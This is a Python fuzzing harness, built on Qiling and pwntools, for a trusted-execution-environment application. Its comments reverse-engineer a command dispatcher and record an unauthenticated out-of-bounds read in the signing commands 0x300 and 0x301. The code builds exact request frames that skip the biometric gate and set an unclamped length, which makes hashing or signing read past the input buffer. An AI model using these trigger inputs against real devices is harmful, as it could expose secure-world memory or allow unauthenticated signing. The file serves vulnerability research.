#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === F2 secauth structure-aware harness (staged build) =====================
# Target: e5140b33-76fa-4c63-ab18062caab2fb5c.ta (staged, sha f8621fad…).
# Real dispatcher @0x1E0E8 (re-derived from the staged .ta):
#   gate: paramTypes==0x65 (params[0]=MEMREF_INPUT, params[1]=MEMREF_OUTPUT);
#         params[0].size==0x40C (1036); params[1].size==0x408 (1032);
#         *(u32*)(params[0].buf)==1 (proto v1).
#   cmd_id (w19) dispatch (staged values differ from the RE doc):
#     1,2 -> is_key_exist ; 0x100..0x103 -> keygen/load ; 0x200 -> remove ;
#     0x300 -> sign_rawstr ; 0x301 -> sign_digest ; 0x400 -> qfp_probe.
#
# PRIMARY TARGET: cmd 0x300 sign_rawstr -> ecc_sign_raw(sub_1fa98) OOB READ.
#   Handler @0x1e2bc: if [IN+0xc]!=0 -> bio gate (sub_0x20a80); else SKIP gate.
#     -> [IN+0x10]==0 -> 0x1e69c: ecc_sign_raw with
#          alg=[IN+0x14], type=[IN+0x18], uid=[IN+0x1c], user_id=[IN+0x20],
#          len=[IN+0x24]  (ATTACKER u32, NEVER clamped vs the 0x40C param size),
#          data=IN+0x28.
#     ecc_sign_raw (sub_1fa98): alg==0 -> SHA256(sub_20d98, data, len) FIRST,
#       before any key load -> hashing reads `len` bytes from IN+0x28; max in-bounds
#       len is 0x40C-0x28 = 0x3E4. len > 0x3E4 -> SHA update walks off the 0x40C
#       param buffer -> asan OOB read.  Reached UNAUTHENTICATED: set [IN+0xc]=0 and
#       [IN+0x10]=0 so the bio/fingerprint gate is never even called.
#
# Frame (params[0], MEMREF_INPUT, size 0x40C):
#   [u32 proto=1]@0 ; [u32 0]@0xc (skip-bio) ; [u32 0]@0x10 (take sign path) ;
#   [u32 alg=0(SHA256)]@0x14 ; [u32 type=0(ASK)]@0x18 ; [u32 uid]@0x1c ;
#   [u32 user_id]@0x20 ; [u32 len=BIG]@0x24 ; data@0x28..
# params[1] OUTPUT size 0x408.

PTYPES = 0x65
INSZ   = 0x40C    # params[0].size==0x40C
OUTSZ  = 0x408    # params[1].size==0x408
CMD    = int(os.environ.get("SA_CMD", "0x300"), 0)

# len at IN+0x24. >0x3E4 overruns. Use a value that walks well past the buffer.
SA_LEN = int(os.environ.get("SA_LEN", str(0x4000)), 0) & 0xFFFFFFFF

def _build(length, alg=0, type_=0, uid=0, user_id=0, skip_bio=True):
    buf = bytearray(INSZ)
    struct.pack_into("<I", buf, 0x00, 1)              # proto v1 (dispatcher gate)
    struct.pack_into("<I", buf, 0x0c, 0 if skip_bio else 1)  # [IN+0xc]: 0 => skip bio gate
    struct.pack_into("<I", buf, 0x10, 0)              # [IN+0x10]: 0 => take sign path
    struct.pack_into("<I", buf, 0x14, alg)            # alg (0=SHA256, 1=SHA1)
    struct.pack_into("<I", buf, 0x18, type_)          # type (0=ASK, 1=BAK)
    struct.pack_into("<I", buf, 0x1c, uid)            # uid
    struct.pack_into("<I", buf, 0x20, user_id)        # user_id
    struct.pack_into("<I", buf, 0x24, length)         # len (ATTACKER, unclamped)
    # data at 0x28.. left as a few real bytes; the bug is the unbounded read length
    buf[0x28:0x38] = b"A" * 0x10
    return bytes(buf)

def _build_301(length):
    # cmd 0x301 (769) sign_digest @0x1e484: signs a caller-supplied DIGEST directly.
    #   skip-auth: [IN+0x18]!=1 AND [IN+0xc]==0 -> bio gate skipped.
    #   sign path @0x1e6f4 -> sub_1f540(type=[IN+0x18], ?=[IN+0x1c], ?=[IN+0x20],
    #     digest=IN+0x28, dlen=[IN+0x24]) -> TEE_AsymmetricSignDigest(op,NULL,0,
    #     digest=IN+0x28, dlen=[IN+0x24]=ATTACKER, ...). dlen unclamped vs 0x40C.
    buf = bytearray(INSZ)
    struct.pack_into("<I", buf, 0x00, 1)        # proto v1 (gate)
    struct.pack_into("<I", buf, 0x0c, 0)        # [IN+0xc]=0 -> skip bio gate
    struct.pack_into("<I", buf, 0x18, 0)        # [IN+0x18]!=1 -> don't force bio
    struct.pack_into("<I", buf, 0x10, 0)        # [IN+0x10]=0 -> take sign path
    struct.pack_into("<I", buf, 0x1c, 0)
    struct.pack_into("<I", buf, 0x20, 0)
    struct.pack_into("<I", buf, 0x24, length)   # digest len (ATTACKER, unclamped)
    buf[0x28:0x38] = b"D" * 0x10
    return bytes(buf)

SWEEP_CMDS = [1, 2, 0x100, 0x101, 0x102, 0x103, 0x200, 0x300, 0x301, 0x400]

def place_input_callback(ql: Qiling, input: bytes, _: int):
    if os.environ.get("SA_MODE") == "fuzz":
        if len(input) < 4:
            return False
        cmd = SWEEP_CMDS[input[0] % len(SWEEP_CMDS)]
        # always pin proto v1 @0; let AFL drive the rest of the 0x40C request blob
        body = input[1:]
        buf = (struct.pack("<I", 1) + body)[:INSZ].ljust(INSZ, b"\x00")
        print(f"[SA-fuzz] cmd={cmd:#x}")
        params = [MemRefParam(buf, INSZ), MemRefParam(bytes(OUTSZ), OUTSZ),
                  NoneParam(), NoneParam()]
        setup_params_fuzz(ql, cmd, PTYPES, params)
        return True

    if CMD == 0x301 or os.environ.get("SA_MODE") == "301":
        length = SA_LEN
        if len(input) >= 4 and "SA_LEN" not in os.environ:
            length = 0x3E4 + (struct.unpack_from("<I", input, 0)[0] % 0x8000)
        buf = _build_301(length)
        print(f"[SA-301] cmd=0x301 sign_digest dlen={length:#x} "
              f"(TEE_AsymmetricSignDigest digest=IN+0x28 dlen={length:#x}; max in-bounds 0x3E4)")
        params = [MemRefParam(buf, INSZ), MemRefParam(bytes(OUTSZ), OUTSZ),
                  NoneParam(), NoneParam()]
        setup_params_fuzz(ql, 0x301, PTYPES, params)
        return True

    length = SA_LEN
    if len(input) >= 4 and "SA_LEN" not in os.environ:
        # AFL explores `len` around the 0x3E4 boundary
        length = 0x3E4 + (struct.unpack_from("<I", input, 0)[0] % 0x8000)
    buf = _build(length)
    print(f"[SA-300] cmd={CMD:#x} sign_rawstr len={length:#x} "
          f"(SHA256 over IN+0x28..+0x28+{length:#x}; max in-bounds 0x3E4 -> OOB read past {INSZ:#x})")
    params = [
        MemRefParam(buf, INSZ),            # params[0] MEMREF_INPUT (redzoned)
        MemRefParam(bytes(OUTSZ), OUTSZ),  # params[1] MEMREF_OUTPUT (redzoned)
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD, PTYPES, params)
    return True
